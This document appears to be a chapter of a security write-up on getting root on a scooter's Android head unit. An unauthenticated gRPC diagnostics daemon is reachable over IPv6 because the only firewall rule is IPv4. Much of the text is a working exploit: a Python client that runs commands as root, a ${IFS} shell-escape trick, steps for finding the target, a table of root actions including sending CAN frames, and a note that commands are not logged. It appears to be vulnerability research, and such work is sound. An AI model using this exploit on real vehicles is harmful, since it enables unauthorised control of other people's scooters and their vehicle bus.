# 02 — Root over IPv6

## The short version

The head unit runs `/vendor/bin/diagnostics_server`. It is a Go program, started
by `init` as **root**, listening on **TCP 50005**. It speaks plain gRPC (HTTP/2
without TLS) and has **no authentication**.

One method runs shell commands:

```proto
rpc ExecuteADBCommand (Command) returns (Response);
message Command  { string cmd_msg = 1; }
message Response { RespStatus status = 1; string status_msg = 2; }
```

The name says "ADB", but it does not use adb. It runs the command directly as
**uid 0**.

---

## Why IPv6

In customer mode, an init script adds an **IPv4-only** firewall rule:

```sh
iptables -I INPUT -p tcp --match multiport --dports 50005,5555 -j DROP
```

There is no matching `ip6tables` rule. So:

| Path | Result |
|---|---|
| `192.168.x.x:50005` | dropped |
| `[fe80::...]:50005` | **open** |

That is the entire bypass. No exploit, no memory corruption, no password.

The daemon also binds to the IPv6 wildcard (`::`), so it listens on every
interface, including the hotspot and the cellular link.

---

## Finding the address

The link-local address is usually derived from the MAC (EUI-64), so it is
stable. Example with a made-up MAC:

```
MAC 00:1A:2B:3C:4D:5E
 → flip the U/L bit        → 02:1A:2B
 → insert FF:FE            → 02:1A:2B:FF:FE:3C:4D:5E
 → fe80::21a:2bff:fe3c:4d5e
```

Windows:

```powershell
# 1. find the scooter's IPv4 lease, then its MAC
Get-NetNeighbor -IPAddress 192.168.1.50

# 2. enable IPv6 on the adapter if it is off (admin)
Enable-NetAdapterBinding -Name "Wi-Fi" -ComponentID ms_tcpip6

# 3. ping the all-nodes multicast, then read the table
ping -6 -n 2 ff02::1%6
Get-NetNeighbor -AddressFamily IPv6
```

Or just run the helper:

```powershell
.\scripts\find-scooter.ps1
```

Linux:

```sh
ping -6 -c 2 ff02::1%wlan0
ip -6 neigh
```

---

## The gRPC target

gRPC needs a special form for IPv6:

```
ipv6:[<address>%<scope>]:50005
```

- `ipv6:` tells the resolver it is IPv6.
- `[ ]` are required around the address.
- `%6` is the **interface number** for a link-local address. Without it, the
  kernel does not know which network to use.
- A global address does not need `%scope`.

Examples:

```
ipv6:[fe80::21a:2bff:fe3c:4d5e%6]:50005
ipv6:[2001:db8::1]:50005
```

The scripts do this for you. Write `fe80::1%6` or pass `--scope 6`.

---

## Minimal client

Only one dependency: `grpcio`.

```python
import grpc

def vi(n):
    out = b""
    while True:
        b, n = n & 0x7F, n >> 7
        out += bytes([b | 0x80]) if n else bytes([b])
        if not n:
            return out

def cmd(s):
    b = s.encode()
    return vi((1 << 3) | 2) + vi(len(b)) + b

ch = grpc.insecure_channel("ipv6:[fe80::1%6]:50005")
grpc.channel_ready_future(ch).result(timeout=5)

fn = ch.unary_unary("/wifican.WifiCanRpc/ExecuteADBCommand",
                    request_serializer=lambda b: b,
                    response_deserializer=lambda b: b)

print(fn(cmd("id -u"), timeout=10))
```

The response is a protobuf `Response`. Field 1 is the status enum
(`0 none`, `1 success`, `2 fail`), field 2 is the text.

---

## The shell trap

`ExecuteADBCommand` does **not** run a shell. It splits the string on whitespace
and `exec`s it. So these do not work:

| Sent | What happens |
|---|---|
| `id; echo hi` | `;` becomes an argument |
| `id \| tr a-z A-Z` | pipe becomes an argument |
| `echo hi > /tmp/x` | `>` becomes an argument |
| `sh -c 'id; echo hi'` | quotes are not stripped; split breaks |

The escape hatch: `;` is not whitespace, and `${IFS}` expands to a space inside
the shell that `sh -c` provides. Send a command with **no literal spaces**:

```sh
sh -c id;echo${IFS}OK
sh -c ls${IFS}-l${IFS}/data/vendor/ola
sh -c dumpsys${IFS}activity${IFS}activities|grep${IFS}ResumedActivity
```

`ola.py shell` does this replacement for you:

```powershell
py scripts\ola.py shell --ipv6 fe80::1%6 "ls -l /data/vendor/ola"
```

If you need to send a command exactly as typed, use `--raw`.

> Do not build these strings in PowerShell by hand: `${IFS}` is a PowerShell
> variable and gets eaten. Let Python do it, or write the command to a file.

---

## What you can do

| Task | Command |
|---|---|
| Confirm root | `id -u` → `0` |
| Read build info | `getprop` |
| List packages | `pm list packages -f` |
| Open Settings | `am start -a android.settings.SETTINGS` |
| Open diagnostic app | `am start -n com.ola.mfgapp/.MainActivity` |
| Screenshot | `screencap -p /data/local/tmp/x.png` |
| Read logs | `logcat -d -t 2000` |
| Watch CAN | `candump vcan0` |
| Send CAN | `cansend vcan0 6AE#0100000000000000` |
| Read files | `cat`, `base64`, `tar` |
| Change UI state | `input keyevent`, `input tap` (normal apps only) |

The shell context is `u:r:shell:s0` with uid 0. SELinux is permissive, so there
is no policy boundary left to stop you.

---

## The other RPC methods

The descriptor lists **40 methods**. Grouped:

| Group | Methods | Risk |
|---|---|---|
| Root exec | `ExecuteADBCommand` | critical |
| CAN | `Init`, `ReadCanFrame`, `WriteCanFrame`, `ReadCanStream`, `WriteCanStream`, `CanDumpStream`, `Deinit` | critical |
| Firmware | `SwUpdateFileClearCache`, `SwUpdateFileTransferMeta`, `SwUpdateFileTransfer`, `SwUpdateTriggerUpgrade`, `SwUpdateCheckStatus`, `SwUpdateTestSetStatus` | critical, **do not call** |
| Identity | `GetVehicleIdentifiers`, `ProvisionVin`, `ProvisionConfig`, `ScooterModeChange` | high, **do not call** |
| Mode | `GetVehicleOperationMode`, `SetVehicleOperationMode` | high |
| Performance flags | `SetEcosFlag`, `SetDynoFlag`, `GetEcosDynoFlags` | high |
| Certificates | `GenerateCerts`, `RegisterInstallCerts`, `ValidateCerts` | high, **do not call** |
| Network | `RemoveWifiCredentials`, `RegisterNavigation` | medium, **do not call** |
| Config | `ConfigUpdate`, `TechPackUpdate`, `CheckManifestFile` | medium |
| Tests | `RemoteRunTestCmd`, `RunSystemTestCmd`, `Local*` | medium |
| Version | `GetSwVersion`, `GetAospVersion`, `InitConnection` | low |

<details>
<summary>Full recovered service definition</summary>

```proto
syntax = "proto3";
package wifican;
import "google/protobuf/empty.proto";

service WifiCanRpc {
  rpc Init (Register) returns (Response);
  rpc Deinit (Empty) returns (Response);
  rpc ReadCanFrame (Empty) returns (CANPacket);
  rpc WriteCanFrame (CANPacket) returns (Response);
  rpc ReadCanStream (Empty) returns (stream CANPacket);
  rpc WriteCanStream (stream CANPacket) returns (Response);
  rpc CanDumpStream (Empty) returns (stream CANPacket);
  rpc GetVehicleOperationMode (Empty) returns (VehicleOperationMode);
  rpc SetVehicleOperationMode (VehicleOperationMode) returns (Response);
  rpc SwUpdateFileClearCache (Empty) returns (Response);
  rpc SwUpdateFileTransferMeta (SwUpdateFileMetadataReq) returns (Response);
  rpc SwUpdateFileTransfer (stream SwUpdateFileChunk) returns (SwUpdateFileMetadataResp);
  rpc SwUpdateTriggerUpgrade (SwUpdateTriggerCmd) returns (Response);
  rpc SwUpdateCheckStatus (Empty) returns (SwUpdateStatus);
  rpc SwUpdateTestSetStatus (SwUpdateStatus) returns (Response);
  rpc GetSwVersion (Empty) returns (Response);
  rpc GetAospVersion (Empty) returns (Response);
  rpc GenerateCerts (Empty) returns (Response);
  rpc RegisterInstallCerts (Empty) returns (Response);
  rpc ValidateCerts (Empty) returns (Response);
  rpc RegisterNavigation (NavigationConfig) returns (Response);
  rpc ProvisionVin (Vin) returns (Response);
  rpc ProvisionConfig (Config) returns (Response);
  rpc GetVehicleIdentifiers (Empty) returns (VehicleIdentifiers);
  rpc ConfigUpdate (Empty) returns (ConfigUpdateResp);
  rpc RemoveWifiCredentials (Empty) returns (Response);
  rpc ScooterModeChange (Empty) returns (Response);
  rpc RemoteRunTestCmd (RmtCmdReq) returns (RmtCmdResp);
  rpc InitConnection (Connection) returns (Response);
  rpc LocalGetConnection (Empty) returns (stream Connection);
  rpc LocalRunTestStream (stream RmtCmdResp) returns (stream RmtCmdReq);
  rpc LocalGetTestCmd (Empty) returns (RmtCmdReq);
  rpc LocalSendTestResp (RmtCmdResp) returns (Response);
  rpc SetEcosFlag (EcosFlag) returns (Response);
  rpc SetDynoFlag (DynoFlag) returns (Response);
  rpc GetEcosDynoFlags (Empty) returns (EcosDynoFlags);
  rpc CheckManifestFile (Empty) returns (Response);
  rpc TechPackUpdate (ConfigType) returns (ConfigUpdateResp);
  rpc ExecuteADBCommand (Command) returns (Response);
  rpc RunSystemTestCmd (SystemTestCmd) returns (SystemTestResp);
}
```

</details>

The descriptor was recovered from the Go binary itself. `protoc-gen-go` embeds a
`FileDescriptorProto` in the executable; walking it gives the real schema, not a
guess. A hand-guessed proto worked by luck for `ExecuteADBCommand` (same field
number and wire type), but it was wrong about the other 23 methods.

---

## Limits and honesty

- **No daemon log.** The config sets `enable_logging: false`, and the log file
  does not exist. Commands are not recorded by the daemon.
- **No authentication, no TLS.** The TLS code exists but cannot start because
  its certificate directory is missing.
- **The channel is link-bound.** It survives app restarts but drops if the
  network path changes. Redial on `UNAVAILABLE`.
- **A sleeping vehicle still answers on 50005** as long as the Android side is
  up. Root access does **not** wake the scooter.
- **Do not call destructive methods.** See the table above. A wrong call can
  reflash an ECU, wipe Wi-Fi, or change the VIN.

---

## Quick check

```powershell
py scripts\ola.py info --ipv6 fe80::1234:5678:9abc:def0 --scope 6
```

Expected:

```
uid            0
android        13
scooter mode   cust
selinux        Permissive
```

If you see `uid 0`, you have root.
